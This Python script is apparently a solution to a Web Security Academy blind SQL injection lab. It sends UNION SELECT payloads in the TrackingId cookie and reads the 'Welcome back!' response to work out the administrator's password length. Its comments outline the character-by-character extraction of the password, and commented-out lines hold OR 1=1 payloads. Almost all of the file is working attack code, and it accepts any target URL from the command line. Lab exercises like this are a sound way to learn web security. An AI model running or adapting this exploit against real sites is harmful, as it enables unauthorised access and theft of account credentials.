import string
import urllib.parse
import time
import requests
import sys
from bs4 import BeautifulSoup

# Adding this so I can use IntelliJ's play button.
# This value is only used if none is supplied from the command line.
MANUAL_CTF_URL = "https://ac9f1f131fa52d2ac032acd300ed00b4.web-security-academy.net/"
# Valid characters that will be used when finding the admin's password via SIMILAR TO with regex
VALID_CHARSET = string.ascii_lowercase + string.digits


# Helper functions
# -----------------

# Parse site URL
def getCtfUrl():
    try:
        site = sys.argv[1]
    except IndexError:
        site = MANUAL_CTF_URL
    if 'https://' in site:
        site = site.rstrip('/').lstrip('https://')
    return f'https://{site}/'


# try_query
# returns True when the query provided results in tricking the site backend by injecting a true statement
# a.k.a when the WHERE clause is true, try_query returns true.
def try_query(query):
    print(f'Query: {query}')
    my_cookies = {'TrackingId': urllib.parse.quote_plus(query)}
    resp = requests.get(url, cookies=my_cookies)
    soup = BeautifulSoup(resp.text, 'html.parser')
    if soup.find('div', text='Welcome back!'):
        return True
    else:
        return False


if __name__ == "__main__":
    url = getCtfUrl()

    begin_time = time.perf_counter()
    num = 1

    # Plan:
    #   Get password length so we can use that to find out when to end password search
    #   Maintain string var holding the password that we know so far
    #   while length of that string is less than password length:
    #       for char in valid char set
    #           try query with and clause of: pw so far + new char attempt + '%'
    #           if that try returns true, append new char to pw so far, print pw so far, and break from for loop
    #   now pw so far should be the password, so outside of any loops just try a SIMILAR_TO query w/ that pw to confirm

    while True:
        and_clause = f'length(password)={num}'
        attempt_qry = f"x' UNION SELECT username FROM users WHERE username='administrator' AND {and_clause}--"
        print(f'Trying length {num}')
        if not try_query(attempt_qry):
            num = num + 1
        else:
            break
    print(f"Password length is {num}")
    print(f"Time elapsed is {time.perf_counter() - begin_time} (seconds)")

    # Output from run (finding admin password length:
    #   Password length is 20
    #   Time elapsed is 14.598776606000229

    # print(try_query("""x' OR 1=1 --"""))
    # print(try_query("""x" OR 1=1 --"""))
